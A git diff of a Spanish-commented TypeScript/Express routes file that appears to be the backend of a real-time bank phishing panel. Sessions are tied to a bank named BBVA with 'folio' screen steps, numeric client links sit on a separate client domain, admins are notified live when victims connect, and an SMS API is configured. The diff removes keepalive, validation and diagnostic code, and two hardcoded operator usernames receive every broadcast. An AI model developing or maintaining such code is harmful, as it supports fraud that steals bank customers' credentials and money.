@@ -562,95 +562,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: "Error creando sesión de prueba" });
     }
   });
-  
-  // Endpoint para crear manualmente una sesión sin creador (para pruebas)
-  app.post('/api/debug/create-session-no-creator', async (req, res) => {
-    try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-      
-      // Solo permitir a superadmin acceder a este endpoint
-      const user = req.user;
-      if (user.username !== 'balonx') {
-        return res.status(403).json({ message: "Solo superadmin puede acceder a este endpoint" });
-      }
-      
-      // Crear sesión sin campo createdBy
-      const sessionId = "99999999"; // ID fijo para pruebas
-      
-      // Crear sesión manualmente
-      const session = await storage.createSession({ 
-        sessionId, 
-        banco: "BBVA",
-        folio: sessionId,
-        pasoActual: ScreenType.FOLIO
-        // Sin incluir createdBy
-      });
-      
-      console.log(`[Debug] Creada sesión de prueba ${sessionId} sin creador`);
-      
-      // Guardar la sesión sin establecer el creador
-      await storage.saveSession(sessionId);
-      
-      // Verificar que no tiene creador
-      const sessionCreated = await storage.getSessionById(sessionId);
-      console.log(`[Debug] Verificación: Sesión ${sessionId} creador=${sessionCreated?.createdBy || 'null'}`);
-      
-      res.json({ 
-        success: true, 
-        session: sessionCreated
-      });
-    } catch (error) {
-      console.error("Error creando sesión de prueba sin creador:", error);
-      res.status(500).json({ message: "Error creando sesión de prueba" });
-    }
-  });
-  
-  // Endpoint para migrar todas las sesiones sin creador (solo para superadmin)
-  app.post('/api/debug/migrate-sessions-creators', async (req, res) => {
-    try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-      
-      // Solo permitir a superadmin acceder a este endpoint
-      const user = req.user;
-      if (user.username !== 'balonx') {
-        return res.status(403).json({ message: "Solo superadmin puede acceder a este endpoint" });
-      }
-      
-      // Obtener todas las sesiones sin creador
-      const allSessions = await storage.getAllSessions();
-      const sessionsWithoutCreator = allSessions.filter(s => !s.createdBy);
-      
-      console.log(`[Migrate] Encontradas ${sessionsWithoutCreator.length} sesiones sin creador de ${allSessions.length} totales`);
-      
-      // Asignar un creador a cada sesión que no lo tenga (admin por defecto)
-      const defaultCreator = 'balonx';
-      let updatedCount = 0;
-      
-      for (const session of sessionsWithoutCreator) {
-        try {
-          await storage.updateSession(session.sessionId, { createdBy: defaultCreator });
-          updatedCount++;
-          console.log(`[Migrate] Asignado creador "${defaultCreator}" a la sesión ${session.sessionId}`);
-        } catch (updateError) {
-          console.error(`[Migrate] Error al actualizar creador de la sesión ${session.sessionId}:`, updateError);
-        }
-      }
-      
-      res.json({
-        success: true,
-        totalSessions: allSessions.length,
-        sessionsWithoutCreator: sessionsWithoutCreator.length,
-        updatedCount
-      });
-    } catch (error) {
-      console.error("[Migrate] Error migrando sesiones:", error);
-      res.status(500).json({ message: "Error migrando sesiones", error: String(error) });
-    }
-  });
 
   app.get('/api/sessions', async (req, res) => {
     try {
@@ -783,20 +694,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post('/api/sessions/:id/save', async (req, res) => {
     try {
       const { id } = req.params;
-      
-      // Asegurar que la sesión tiene un creador antes de guardarla
-      if (req.isAuthenticated()) {
-        await ensureSessionHasCreator(id, req.user.username);
-      }
-      
       const session = await storage.saveSession(id);
-
-      // Verificar después de guardar si la sesión tiene creador,
-      // si no, asignar el usuario que la está guardando
-      if (!session.createdBy && req.isAuthenticated()) {
-        console.log(`[SaveSession] Sesión ${id} guardada sin creador. Asignando creador: ${req.user.username}`);
-        await storage.updateSession(id, { createdBy: req.user.username });
-      }
 
       // Notify all admin clients
       broadcastToAdmins(JSON.stringify({
@@ -895,15 +793,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
         createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
       });
 
-      // Asegurar que el creador esté establecido antes de guardar
-      await ensureSessionHasCreator(sessionId, user.username);
-      console.log(`Creador de sesión verificado para ${sessionId}: ${user.username}`);
-      
       // Guardar la sesión automáticamente para que aparezca en el historial
       const savedSession = await storage.saveSession(sessionId);
       console.log(`Sesión guardada automáticamente: ${sessionId}`);
       
-      // Verificar si el campo createdBy está correctamente establecido tras guardar
+      // Verificar si el campo createdBy está correctamente establecido
       if (!savedSession.createdBy) {
         console.log(`ADVERTENCIA: Creador no establecido en la sesión guardada ${sessionId}. Forzando creador: ${user.username}`);
         await storage.updateSession(sessionId, { createdBy: user.username });
@@ -917,21 +811,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;
       
       // Armamos los enlaces para ambos dominios
-      // En Replit, usamos la URL actual de la solicitud para construir los enlaces
-      // Esto asegura que funcione en cualquier entorno de Replit, incluso si cambia el dominio
-      const hostWithProtocol = req.headers.host 
-        ? `${req.protocol}://${req.headers.host}` 
-        : isReplit 
-          ? `https://${process.env.REPL_SLUG}.replit.dev`
-          : `https://${clientDomain}`;
-      
-      // Construimos los enlaces usando la URL base detectada
-      // Para simplificar, usamos directamente el código numérico como ruta en el entorno de Replit
+      // Usamos el formato numérico directamente (sin "client/") en la URL
       const clientLink = isReplit 
-        ? `${hostWithProtocol}/${sessionId}` 
+        ? `https://${process.env.REPL_SLUG}.replit.dev/${sessionId}` 
         : `https://${clientDomain}/${sessionId}`;
       const adminLink = isReplit 
-        ? hostWithProtocol
+        ? `https://${process.env.REPL_SLUG}.replit.dev` 
         : `https://${adminDomain}`;
 
       console.log(`Nuevo enlace generado - Código: ${linkCode}, Banco: ${banco}`);
@@ -1034,129 +919,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
   
   // WebSocket handling
   wss.on('connection', (ws, req) => {
-    // Más información para diagnóstico de conexiones
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
-    const url = req.url || 'unknown';
-    const userAgent = req.headers['user-agent'] || 'unknown';
-    
-    console.log(`[WebSocket] Nueva conexión desde IP: ${ip}, URL: ${url}`);
-    
-    // Establecer tiempo máximo de inactividad para terminar conexiones muertas
-    // @ts-ignore - Añadimos propiedad isAlive que no existe en la definición
-    ws.isAlive = true;
-    
-    // Variables para identificar este socket después
-    let socketRole: 'CLIENT' | 'ADMIN' | 'UNKNOWN' = 'UNKNOWN';
-    let socketSessionId: string | null = null;
-    let socketUsername: string | null = null;
-    let lastPingTime: number = Date.now();
-    let pingCount: number = 0;
-    
-    // Añadir ping periódico para mantener la conexión activa
-    const pingInterval = setInterval(() => {
-      // @ts-ignore - Verificamos isAlive
-      if (ws.isAlive === false) {
-        console.log(`[WebSocket] Terminando conexión inactiva: ${socketRole} - ${socketSessionId || socketUsername || 'desconocido'}`);
-        clearInterval(pingInterval);
-        return ws.terminate();
-      }
-      
-      // @ts-ignore - Reseteamos isAlive y esperamos pong
-      ws.isAlive = false;
-      
-      // Enviar ping usando protocolo WebSocket nativo
-      if (ws.readyState === WebSocket.OPEN) {
-        try {
-          ws.ping();
-          pingCount++;
-          
-          // También enviar un ping como mensaje JSON (adicional al ping WebSocket nativo)
-          if (pingCount % 2 === 0) { // Cada 2 pings nativos, enviar uno como mensaje
-            ws.send(JSON.stringify({
-              type: 'PING',
-              timestamp: Date.now(),
-              serverInfo: {
-                uptime: process.uptime(),
-                pingCount
-              }
-            }));
-          }
-        } catch (e) {
-          console.error(`[WebSocket] Error enviando ping:`, e);
-        }
-      }
-    }, 15000); // Cada 15 segundos (más frecuente para mejor respuesta)
+    console.log('New WebSocket connection');
 
-    // Manejar pongs del protocolo WebSocket
-    ws.on('pong', () => {
-      // @ts-ignore - Marcamos que el socket sigue vivo
-      ws.isAlive = true;
-      lastPingTime = Date.now();
-    });
-    
-    // Manejar cierre de conexión
-    ws.on('close', (code, reason) => {
-      clearInterval(pingInterval);
-      
-      // @ts-ignore - Asegurar que el socket se marca como inactivo
-      ws.isAlive = false;
-      
-      // Eliminar de los mapas según su rol
-      if (socketRole === 'CLIENT' && socketSessionId) {
-        clients.delete(socketSessionId);
-        console.log(`[WebSocket] Cliente desconectado - Sesión: ${socketSessionId}`);
-      } else if (socketRole === 'ADMIN' && socketUsername) {
-        adminClients.delete(socketUsername);
-        console.log(`[WebSocket] Admin desconectado - Usuario: ${socketUsername}`);
-      } else {
-        console.log('[WebSocket] Conexión no identificada cerrada');
-      }
-      
-      console.log(`[WebSocket] Conexión cerrada: Código ${code}, Razón: ${reason || 'No especificada'}`);
-    });
-
-    // Manejar errores de WebSocket
-    ws.on('error', (error) => {
-      console.error('[WebSocket] Error en conexión:', error);
-    });
-
-    // Handle client/admin identification and messages
+    // Handle client/admin identification
     ws.on('message', async (message) => {
       try {
         const data = JSON.parse(message.toString());
-        
-        // No loguear mensajes de PING para reducir ruido en logs
-        if (data.type !== 'PING') {
-          console.log('[WebSocket] Mensaje recibido:', data.type);
-        }
-        
-        // Actualizar siempre el estado isAlive con cada mensaje recibido
-        // @ts-ignore
-        ws.isAlive = true;
-        
-        // Manejar pings del cliente para mantener la conexión activa
-        if (data.type === 'PING') {
-          // Registrar información de diagnóstico del cliente
-          if (data.clientInfo) {
-            // Solo logueamos la primera vez para evitar ruido
-            if (pingCount === 0) {
-              console.log(`[WebSocket] Info de cliente: URL=${data.clientInfo.url}, UA=${data.clientInfo.userAgent || 'N/A'}`);
-            }
-          }
-          
-          // Responder con un PONG
-          ws.send(JSON.stringify({
-            type: 'PONG',
-            timestamp: Date.now(),
-            serverInfo: {
-              connectionType: socketRole,
-              sessionId: socketSessionId,
-              username: socketUsername,
-              uptime: process.uptime()
-            }
-          }));
-          return;
-        }
 
         // Register client or admin
         if (data.type === 'REGISTER') {
@@ -1176,13 +944,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
             
             // Guardar el cliente en el Map con su username como clave
             adminClients.set(userName, ws);
+            console.log(`Admin client registered: ${userName}`);
             
-            // Actualizar variables de identificación para este socket
-            socketRole = 'ADMIN';
-            socketUsername = userName;
-            
-            console.log(`[WebSocket] Admin registrado: ${userName} (rol: ${user.role})`);
-            console.log(`[WebSocket] Usuario ${userName} (rol: ${user.role}) autenticado, obteniendo sesiones...`);
+            console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}) autenticado, obteniendo sesiones...`);
             
             // NUEVA IMPLEMENTACIÓN UNIFICADA PARA TODOS LOS USUARIOS
             if (false) { // Este bloque nunca se ejecuta, solo se mantiene para referencia
@@ -1276,82 +1040,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
             }
           } 
           else if (data.role === 'CLIENT' && data.sessionId) {
-            // Validar formato del sessionId para evitar errores
-            const sessionId = data.sessionId.toString();
-            const isValidSessionId = /^\d{8}$/.test(sessionId);
-            
-            if (!isValidSessionId) {
-              console.log(`Error: Formato de sessionId inválido: ${sessionId}`);
-              ws.send(JSON.stringify({
-                type: 'ERROR',
-                message: 'Formato de código de sesión inválido. Debe ser un número de 8 dígitos.'
-              }));
-              return;
-            }
-            
-            // Si ya existe un cliente conectado con este sessionId, lo desconectamos
-            if (clients.has(sessionId)) {
-              const existingClient = clients.get(sessionId);
-              if (existingClient && existingClient !== ws) {
-                console.log(`Reemplazando cliente existente para sesión ${sessionId}`);
-                existingClient.close(1000, 'Replaced by new connection');
-              }
-            }
-            
-            // Registrar el nuevo cliente
-            clients.set(sessionId, ws);
-            
-            // Actualizar variables de identificación para este socket
-            socketRole = 'CLIENT';
-            socketSessionId = sessionId;
-            
-            console.log(`[WebSocket] Cliente registrado con sessionId: ${sessionId}`);
+            clients.set(data.sessionId, ws);
+            console.log(`Client registered with session ID: ${data.sessionId}`);
 
-            try {
-              // Obtener información de la sesión
-              const session = await storage.getSessionById(sessionId);
-              
-              if (session) {
-                // Verificar y actualizar el creador si es necesario
-                if (session.createdBy) {
-                  console.log(`Verificando información de creador para sesión ${sessionId}: ${session.createdBy}`);
-                  try {
-                    await ensureSessionHasCreator(sessionId, session.createdBy);
-                  } catch (error) {
-                    console.error(`Error al actualizar creador para sesión ${sessionId}:`, error);
-                  }
-                }
-                
-                // Actualizar la última actividad de la sesión
-                await storage.updateSessionActivity(sessionId);
-                
-                // Enviar datos de la sesión al cliente
-                ws.send(JSON.stringify({
-                  type: 'INIT_SESSION',
-                  data: session
-                }));
-                
-                // Notificar a los administradores sobre la conexión del cliente
-                const adminMessage = `Cliente conectado para sesión ${sessionId} (banco: ${session.banco || 'No especificado'})`;
-                const creator = session.createdBy || '';
-                broadcastToAdmins(JSON.stringify({
-                  type: 'CLIENT_CONNECTED',
-                  message: adminMessage,
-                  sessionId,
-                  timestamp: new Date().toISOString()
-                }), creator);
-              } else {
-                console.log(`No se encontró información para la sesión ${sessionId}`);
-                ws.send(JSON.stringify({
-                  type: 'ERROR',
-                  message: 'No se encontró la sesión solicitada. Es posible que haya expirado o se haya eliminado.'
-                }));
-              }
-            } catch (error) {
-              console.error(`Error al procesar conexión de cliente para sesión ${sessionId}:`, error);
+            // Get session info and send to client
+            const session = await storage.getSessionById(data.sessionId);
+            if (session) {
               ws.send(JSON.stringify({
-                type: 'ERROR',
-                message: 'Error al procesar la conexión: ' + (error instanceof Error ? error.message : 'Error desconocido')
+                type: 'INIT_SESSION',
+                data: session
               }));
             }
           }
@@ -1584,28 +1281,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
     });
   });
 
-  // Endpoint de diagnóstico para problemas de conexión
-  app.get('/api/healthcheck', (req, res) => {
-    const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;
-    
-    // Información básica del servidor para diagnóstico
-    const serverInfo = {
-      status: 'online',
-      timestamp: new Date().toISOString(),
-      env: process.env.NODE_ENV || 'development',
-      isReplit: !!isReplit,
-      replSlug: process.env.REPL_SLUG,
-      host: req.headers.host,
-      protocol: req.protocol,
-      wsConnections: {
-        activeClients: clients.size,
-        activeAdminClients: adminClients.size
-      }
-    };
-    
-    res.json(serverInfo);
-  });
-  
   // === API de SMS ===
 
   // Obtener la configuración actual de la API de SMS
@@ -2143,36 +1818,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 }
 
 // Helper function to broadcast to admin clients, with option to target specific users
-// Función para asegurar que una sesión tenga un creador asignado
-async function ensureSessionHasCreator(sessionId: string, creatorUsername: string): Promise<void> {
-  try {
-    if (!creatorUsername || typeof creatorUsername !== 'string' || creatorUsername.trim() === '') {
-      console.error(`[EnsureCreator] Nombre de usuario inválido para asignar como creador: "${creatorUsername}"`);
-      return;
-    }
-    
-    const session = await storage.getSessionById(sessionId);
-    
-    if (!session) {
-      console.error(`[EnsureCreator] No se encontró la sesión ${sessionId}`);
-      return;
-    }
-    
-    // Verificar si no tiene creador o si el creador es vacío/inválido
-    if (!session.createdBy || typeof session.createdBy !== 'string' || session.createdBy.trim() === '') {
-      console.log(`[EnsureCreator] Asignando creador "${creatorUsername}" a la sesión ${sessionId} (previo: ${session.createdBy || 'ninguno'})`);
-      await storage.updateSession(sessionId, { createdBy: creatorUsername });
-    } else {
-      console.log(`[EnsureCreator] Sesión ${sessionId} ya tiene creador: ${session.createdBy}`);
-    }
-  } catch (error) {
-    console.error(`[EnsureCreator] Error al asignar creador a la sesión ${sessionId}:`, error);
-  }
-}
-
-function broadcastToAdmins(message: string, targetUsername?: string | null) {
-  // Aseguramos que targetUsername no sea null
-  const target = targetUsername || undefined;
+function broadcastToAdmins(message: string, targetUsername?: string) {
   // Intentar parsear el mensaje para logging y extraer información
   try {
     const parsedMessage = JSON.parse(message);
@@ -2184,11 +1830,6 @@ function broadcastToAdmins(message: string, targetUsername?: string | null) {
       targetUsername = parsedMessage.data.createdBy;
       console.log(`[Broadcast] Estableciendo targetUsername a ${targetUsername} basado en createdBy`);
     }
-    
-    // Si el mensaje es de actualización de sesión o generación de enlace, nos aseguramos de que tenga creador
-    if (parsedMessage.type === 'SESSION_UPDATE' && parsedMessage.data && parsedMessage.data.sessionId) {
-      ensureSessionHasCreator(parsedMessage.data.sessionId, parsedMessage.data.createdBy || targetUsername || 'unknown');
-    }
   } catch (e) {
     console.log(`[Broadcast] Enviando mensaje (formato no JSON)`);
   }
@@ -2196,14 +1837,14 @@ function broadcastToAdmins(message: string, targetUsername?: string | null) {
   // Si se especifica un usuario objetivo, enviamos el mensaje solo a ese usuario y a todos los administradores
   let sentCount = 0;
   
-  if (target) {
+  if (targetUsername) {
     // Buscar el cliente del usuario objetivo y los administradores
     const entries = Array.from(adminClients.entries());
     for (let i = 0; i < entries.length; i++) {
       const [username, client] = entries[i];
       
       // Consideramos que cualquier usuario que está conectado como admin debe ser un admin, y también envíamos al usuario que creó
-      if ((username === target || username === 'balonx' || username === 'yako') && client.readyState === WebSocket.OPEN) {
+      if ((username === targetUsername || username === 'balonx' || username === 'yako') && client.readyState === WebSocket.OPEN) {
         client.send(message);
         sentCount++;
         console.log(`[Broadcast] Mensaje enviado específicamente a ${username}`);
